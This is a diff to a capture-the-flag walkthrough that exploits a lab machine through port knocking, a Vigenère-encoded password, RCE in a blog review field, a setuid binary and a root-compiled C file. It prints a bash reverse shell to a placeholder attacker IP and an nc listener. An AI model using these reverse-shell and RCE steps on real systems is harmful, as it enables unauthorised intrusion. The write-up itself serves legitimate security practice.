@@ -2,7 +2,7 @@
 # Author: Atharva Bordavekar
 # Difficulty: Medium
 # Points: 60
-# Vulnerabilities:
+# Vulnerabilities: Port Knocking, Cipher Decryption, RCE via insecure input fields, Reverse Engineering
 
 # Phase 1 - Reconnaissance:
 
@@ -113,11 +113,16 @@ at the /user directory we find an id_rsa private key for some user. lets paste i
 # give the id_rsa the appropriate permissions
 chmod 600 id_rsa
 ```
+
+# Phase 2 - Initial Foothold:
+
 after a long time of enumeration, i fell into another rabbit hole. then i realized that the credentials might be encrypted since we never really used them on the login page at port 8080 webpage. lets use this ![Viginere Cipher Decrypter ](https://www.dcode.fr/vigenere-cipher) to decrypt  the viginere cipher (just an assumption since viginere ciphers are the most common in CTFs). enter the key as the one we found at the secret directory of the webpage at port 445. turns out we were right! we get bob's credentials. lets use them on the login page.
 
 ```bash
 http://<target_ip>:8080/login
 ```
+# Shell as www-data:
+
 after entering the credentials, we find a review field where we can enter user input. lets test it for potential RCE vulnerability. type in `id` into the field and then click on the link which will take us to the review. and just like that, we have acheived RCE! lets use a bash reverse shell to get an initial foothold.
 
 ```bash
@@ -127,7 +132,11 @@ nc -lnvp 4444
 ```bash
 bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
 ```
-click on the review link to trigger the reverse shell. and bingo, we get a shell as www-data! lets go directly to the /tmp directory and run linpeas. the linpeas output reveals an unusual binary at /usr/bin/blogFeedback. did not find anything useful using the strings command. lets transfer it to the attacker machine and then analyse it using Ghidra. after analysing the binary, i found something interesting in the main() function of the decompiled program. 
+click on the review link to trigger the reverse shell. and bingo, we get a shell as www-data! lets go directly to the /tmp directory and run linpeas. 
+
+# Shell as bobbloglaw:
+
+the linpeas output reveals an unusual binary at /usr/bin/blogFeedback. did not find anything useful using the strings command. lets transfer it to the attacker machine and then analyse it using Ghidra. after analysing the binary, i found something interesting in the main() function of the decompiled program. 
 
 the orignal program basically accepts 6 parameters. if given either greater or lesser than 7, the executable will print `Order my blogs`. if there are exactly 7 arguments but the arguments are not in order, then it will print `Hmm... I disagree!`. and lastly if there are exactly 7 arguments with all the arguements being in the correct order which in this case is 6 5 4 3 2 1 since the condition is when local_c = 1, the argument will be 7-1=6, and so on. in short the conditon starts from 7, and subtracts the number of argument it is from 7. for eg if the argument is the 5th argument, then it will become 7-5=2. lets use this to get a shell as bobloblaw
 
@@ -135,6 +144,8 @@ the orignal program basically accepts 6 parameters. if given either greater or l
 /usr/bin/blogFeedback 6 5 4 3 2 1
 ```
 we have a shell as bobloblaw. lets read the user.txt present in the /home/bobloblaw/Desktop directory. after doing this i did some manual enumeration and found a lot of potential attack vectors like a cronjob running as root, us g=having 2 sudo capabilities as root, and a few 95% attack vectors from the linpeas output. however none of them worked for me. so i decided to use pspy64 to analyse what other processes are running in the backgorund. then i found this
+
+# Phase 3 - ROOT access:
 
 a C program was being compiled, executed and then deleted by root. turns out that the name C program is writable by us. let me simply remove this C file and add my own malicious C reverseshell with the same name.
 
